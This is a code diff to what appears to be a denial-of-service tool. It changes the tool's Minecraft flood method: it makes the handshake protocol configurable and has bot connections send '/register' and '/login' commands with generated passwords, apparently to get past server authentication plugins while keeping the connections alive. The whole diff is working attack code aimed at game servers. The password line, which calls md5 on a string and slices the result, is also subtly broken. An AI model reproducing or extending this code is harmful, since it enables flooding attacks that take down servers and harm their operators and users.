@@ -35,6 +35,7 @@ from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP
 from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
 from requests import Response, Session, exceptions, get, cookies
 from yarl import URL
+from hashlib import md5
 
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
             datefmt="%H:%M:%S")
@@ -442,7 +443,7 @@ class Layer4(Thread):
         Tools.safe_close(s)
 
     def MINECRAFT(self) -> None:
-        handshake = Minecraft.handshake(self._target, 74, 1)
+        handshake = Minecraft.handshake(self._target, self.protocolid, 1)
         ping = Minecraft.data(b'\x00')
 
         s = None
@@ -513,9 +514,14 @@ class Layer4(Thread):
                                                         2,
                                                         ProxyTools.Random.rand_ipv4(),
                                                         uuid4()))
+            username = f"{con['MCBOT']}{ProxyTools.Random.rand_str(5)}"
+            password = md5(username)[:8].title()
 
-            Tools.send(s, Minecraft.login(self.protocolid, f"{con['MCBOT']}{ProxyTools.Random.rand_str(5)}"))
+            Tools.send(s, Minecraft.login(self.protocolid, username))
             sleep(1.5)
+
+            Tools.send(s, Minecraft.chat(self.protocolid, "/register %s %s" % (password, password)))
+            Tools.send(s, Minecraft.chat(self.protocolid, "/login %s" % password))
 
             c = 360
             while Tools.send(s, Minecraft.keepalive(self.protocolid, ProxyTools.Random.rand_int(1111111, 9999999))):
